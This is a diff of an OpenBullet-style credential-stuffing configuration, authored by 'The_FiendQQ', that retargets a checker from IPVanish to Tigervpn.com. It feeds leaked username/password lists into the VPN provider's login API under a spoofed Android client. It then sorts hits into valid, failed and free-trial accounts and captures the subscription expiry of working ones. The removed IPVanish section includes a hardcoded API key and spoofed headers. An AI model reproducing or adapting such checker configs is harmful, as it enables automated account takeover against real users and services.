@@ -1,11 +1,11 @@
 [SETTINGS]
 {
-  "Name": "IPVanish",
+  "Name": "Tigervpn.com",
   "SuggestedBots": 100,
   "MaxCPM": 0,
-  "LastModified": "2020-09-04T16:20:07.453103+04:30",
+  "LastModified": "2020-09-04T15:52:37.8983498+04:30",
   "AdditionalInfo": "",
-  "Author": "",
+  "Author": "\"The_FiendQQ\"",
   "Version": "1.4.4 [Anomaly]",
   "IgnoreResponseErrors": false,
   "MaxRedirects": 8,
@@ -15,7 +15,7 @@
   "MaxProxyUses": 0,
   "BanProxyAfterGoodStatus": false,
   "EncodeData": false,
-  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist1": "Credentials",
   "AllowedWordlist2": "",
   "DataRules": [],
   "CustomInputs": [],
@@ -50,28 +50,23 @@
 }
 
 [SCRIPT]
-FUNCTION GenerateGUID -> VAR "uuid" 
-
-REQUEST POST "https://account.ipvanish.com/api/v3/login" 
-  CONTENT "{\"api_key\":\"15cb936e6d19cd7db1d6f94b96017541\",\"client\":\"Android-3.4.2.4.52178b52178\",\"os\":\"22\",\"password\":\"<PASS>\",\"username\":\"<USER>\",\"uuid\":\"<uuid>\"}" 
-  CONTENTTYPE "application/json" 
-  HEADER "X-Client: ipvanish" 
-  HEADER "X-Client-Version: 1.2." 
-  HEADER "X-Platform: Android" 
-  HEADER "X-Platform-Version: 22" 
-  HEADER "Host: account.ipvanish.com" 
-  HEADER "Connection: Keep-Alive" 
-  HEADER "User-Agent: okhttp/3.12.0" 
+#Login REQUEST POST "https://www.tigervpn.com/api/v3/auth/login.json" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "Content-Length: 57" 
+  HEADER "Host: www.tigervpn.com" 
+  HEADER "Connection: close" 
   HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: okhttp/3.10.0" 
 
 KEYCHECK 
-  KEYCHAIN Success OR 
-    KEY "email" 
-    KEY "access_token" 
   KEYCHAIN Failure OR 
-    KEY "The username or password provided is incorrect" 
+    KEY "{\"status\":\"error" 
+    KEY "\"message\":\"Username or password incorrect.\"" 
+  KEYCHAIN Success OR 
+    KEY "{\"status\":\"success" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"is_trial\":true" 
 
-PARSE "<SOURCE>" JSON "sub_end_epoch" -> VAR "expire" 
-
-#Expiry_Date FUNCTION UnixTimeToDate "<expire>" -> CAP "Expiry Date" 
+#Expire PARSE "<SOURCE>" JSON "expires_at" CreateEmpty=FALSE -> CAP "Expire" 
 
